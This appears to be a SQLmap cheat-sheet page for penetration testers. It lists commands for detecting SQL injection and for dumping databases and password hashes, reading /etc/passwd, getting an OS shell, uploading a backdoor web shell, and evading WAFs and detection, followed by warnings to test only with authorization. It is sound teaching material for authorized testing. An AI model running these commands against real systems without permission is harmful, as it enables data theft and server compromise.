SQLmap
Automatic SQL injection and database takeover tool

Web Application
Description
SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It can detect various types of SQL injection and can access the database, dump data, and even get a shell on the server in some cases.

Installation / Check
Check if installed:

which sqlmap
Install command:

sudo apt install sqlmap
Basic Syntax
sqlmap -u "<URL with parameter>" [options]
Common Commands
Command	What it does	When to use	Risk
sqlmap -u "http://target.com/page?id=1"

Basic test - Check if parameter is injectable	First injection test	
sqlmap -u "http://target.com/page?id=1" --dbs

List databases - Show all databases	Enumerate databases	
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

List tables - Show tables in database	Enumerate tables	
sqlmap -u "http://target.com/page?id=1" -D db -T users --columns

List columns - Show table structure	Find column names	
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump

Dump table - Extract all data	Data extraction	
sqlmap -u "http://target.com/page?id=1" --batch

Batch mode - No user prompts	Automated testing	
sqlmap -u "http://target.com/page?id=1" --forms

Test forms - Auto-detect and test forms	Login/search forms	
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

Max testing - All payloads, max risk	Thorough testing	
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ

All techniques - Try all injection types	Bypass WAF	
sqlmap -u "http://target.com/page?id=1" --current-user

Current DB user - Show database user	Check privileges	
sqlmap -u "http://target.com/page?id=1" --current-db

Current database - Show active DB	Quick DB check	
sqlmap -u "http://target.com/page?id=1" --is-dba

Check DBA - Is user admin?	Privilege check	
sqlmap -u "http://target.com/page?id=1" --os-shell

OS shell - Get system command shell	Full system access	
sqlmap -u "http://target.com/page?id=1" --sql-shell

SQL shell - Interactive SQL console	Direct DB queries	
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

Read file - Read server files	File disclosure	
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"

Write file - Upload file to server	Backdoor upload	
sqlmap -u "http://target.com/page?id=1" --passwords

Dump passwords - Extract DB user hashes	Credential extraction	
sqlmap -u "http://target.com/page?id=1" --dump-all

Dump everything - Extract entire database	Full data extraction	
sqlmap -r request.txt

From Burp - Test captured request	Complex requests	
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

With cookie - Test authenticated endpoint	Post-login testing	
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

Through proxy - Route via Burp	Traffic analysis	
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

WAF bypass - Use tamper script	Evade WAF filters	
sqlmap -u "http://target.com/page?id=1" --random-agent

Random User-Agent - Avoid detection	Stealth testing	
sqlmap -u "http://target.com/page?id=1" --threads=10

Multi-threaded - Faster scanning	Speed up testing	
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

Specify DBMS - Target specific database	Known DB type	
sqlmap -u "http://target.com/page?id=1" --time-sec=10

Time delay - For time-based blind	Slow networks	
Step-by-Step Guide
1
Find a URL with parameters (like ?id=1 or ?search=test)
2
Open terminal and run: sqlmap -u "URL" to test for injection
3
If vulnerable, SQLmap will show the injection type
4
Use --dbs to list available databases
5
Use -D dbname --tables to list tables
6
Use --dump to extract data (only on authorized targets!)
7
Review the output in the terminal or saved files
Understanding the Output
SQLmap shows injection type (Boolean-based, Time-based, UNION, etc.), database type (MySQL, PostgreSQL, etc.), and extracted data. Green [INFO] messages show progress, red [CRITICAL] shows errors.

Important Warnings
•
SQL injection testing without permission is ILLEGAL
•
This tool can damage databases - use with extreme caution
•
Always have written authorization before testing
•
Data extraction from unauthorized systems is a crime
•
Use only on your own applications or with explicit permission
⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
